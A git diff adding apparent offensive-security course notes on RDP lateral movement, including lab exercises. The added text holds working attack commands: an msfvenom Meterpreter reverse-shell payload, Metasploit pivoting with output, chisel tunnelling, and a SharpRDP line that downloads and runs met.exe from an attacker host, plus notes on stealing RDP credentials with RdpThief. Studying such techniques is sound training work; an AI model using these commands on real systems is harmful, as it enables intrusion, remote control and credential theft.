@@ -10,7 +10,7 @@ Multi channel network protocol devveloped by Microsoft and is used for comunicat
 
 It is commonly used in many corporate environments for remote administration using windows native remote Desktop connection application
 
-# lateral ovement with rdp
+# lateral movement with rdp
 
 using rdektop in kali machine we will run mstsc.exe
 and connect to appsrv01
@@ -107,6 +107,151 @@ through PowerShell remoting.
 
 # Reverse RDP Proxying with Metasploit
 
+There would be NAT configuration in firewall. 
+We can use the traffic from compromised machine to the attacker machine to get data.
+
+step 1 : compromise a windows machine
+step 2 : use kali multi/manage/autoroute. This will allow us to configure a reverse tunnel through meterpreter session
+
+used commands - 
+
+```
+kali@kali:~$ sudo msfvenom -p windows/x64/meterpreter_reverse_https LHOST=10.10.6.10 LPORT=4444 -f exe -o /var/www/html/msfn.exe
+
+```
+
+```
+use multi/handler
+set windows/x64/meterpreter_reverse_https
+set LHOST
+set LPORT
+exploit
+```
+
+and then on getting a shell and putting it on the background following commands were run
+
+```
+msf5 exploit(multi/handler) > use multi/manage/autoroute
+msf5 post(multi/manage/autoroute) > set session 1
+session => 1
+msf5 post(multi/manage/autoroute) > exploit
+
+[!] SESSION may not be compatible with this module.
+[*] Running module against WINWORK
+[*] Searching for subnets to autoroute.
+[+] Route added to subnet 10.10.0.0/255.255.0.0 from host's routing table.
+[*] Post module execution completed
+msf5 post(multi/manage/autoroute) > use auxiliary/server/socks4a
+msf5 auxiliary(server/socks4a) > set srvhost 127.0.0.1
+srvhost => 127.0.0.1
+msf5 auxiliary(server/socks4a) > exploit -j
+[*] Auxiliary module running as background job 0.
+msf5 auxiliary(server/socks4a) > 
+
+```
+
+then add `socks4 127.0.0.1 1080` to the etc/proxychains.conf
+
+```
+kali@kali:~$ proxychains rdesktop 10.10.6.111
+ProxyChains-3.1 (http://proxychains.sf.net)
+Autoselecting keyboard map 'en-us' from locale
+|S-chain|-<>-127.0.0.1:1080-<>-143.110.254.137:9797-<><>-10.10.6.111:3389-<--timeout
+Core(error): tcp_connect(), unable to connect to 10.10.6.111
+```
+this did not work
+
+### 13.1.2.1 Exercise
+1. Configure a reverse tunnel with Metasploit and get RDP access to the Windows 10 client
+machine.
+
+# Reverse RDP Proxying with Chisel
+
+when using powershell empire or covenant we may need standalone applications
+
+one of the tools is chisel - written in golang
+
+https://github.com/jpillora/chisel
+
+need golang
+
+`sudo apt update && sudo apt install golang`
+
+With the Linux version compiled, we’ll turn to the Windows version. We can cross-compile chisel
+for other operating systems and architectures with the Golang compiler. We’ll first specify a 64-bit
+Windows executable with the env environment variable796 command. We’ll then set GOOS and
+GOARCH to “windows” and “amd64” respectively.
+
+Next, we’ll run go build, specifying the output file name (-o) and linker arguments797 (-ldflags
+“-s -w”798), which will strip debugging information from the resulting binary:
+
+`env GOOS=windows GOARCH=amd64 go build -o chisel.exe -ldflags "-s -w"`
+
+`./chisel server -p 8080 --socks5`
+
+`sudo sed -i 's/#PasswordAuthentication yes PasswordAuthentication yes/g' /etc/ssh/sshd_config`
+
+`sudo systemctl start ssh.service`
+
+`ssh -N -D 0.0.0.0:1080 localhost`
+
+`chisel.exe client 192.168.119.120:8080 socks`
+
+`sudo proxychains rdesktop 192.168.120.10`
+
+> We can also use chisel with the classic reverse SSH tunnel syntax by specifying the -reverse option instead of --socks5 on the server side
+
+### 13.1.3.1 Exercise
+1. Configure a reverse tunnel with chisel and get RDP access to the Windows 10 client
+machine.
+
+# RDP as a Console
+
+Although RDP is most often associated with the mstsc GUI client, it can also be used as a
+command-line tool. This technique reduces our overhead while still relying on the RDP protocol,
+which will often blend in well with typical network traffic.
+The RDP application (mstsc.exe) builds upon the terminal services library mstscax.dll
+
+SharpRDP801,802 is a C# application that uses uses the non-scriptable interfaces exposed by
+mstscax.dll to perform authentication in the same way as mstsc.exe.
+
+https://github.com/0xthirteen/SharpRDP
+
+```
+SharpRDP.exe computername=appsrv01 command=notepad username=corp1\dave
+password=lab
+```
+
+also we can use
+
+```
+sharprdp.exe computername=appsrv01 command="powershell (New-Object
+System.Net.WebClient).DownloadFile('http://192.168.119.120/met.exe',
+'C:\Windows\Tasks\met.exe'); C:\Windows\Tasks\met.exe" username=corp1\dave
+password=lab
+
+exploit
+```
+
+### 13.1.4.1 Exercise
+1. Repeat the steps in this section to get a reverse Meterpreter shell through the use of
+SharpRDP.
+
+# stealing clear text credentials from RDP
+
+> Keyloggers are often used to capture clear text credentials. However, it can be difficult to isolate passwords with a generic keylogger and lengthy sessions can result in very verbose output, which can be difficult to parse.
+
+for example we can try and hook into application like winexec
+API hooking. Instead of pausing execution,
+we could overwrite the initial instructions of an API at the assembly level with code that transfers
+execution to any custom code we want. The Microsoft-provided unmanaged Detours library806
+makes this possible and would allow an attacker to leak information from any API
+
+RDPTheif was used which s=uses detours to hook onto the APIS
+
+https://github.com/0x09AL/RdpThief
+
+load rdp theifdll
 
 
 
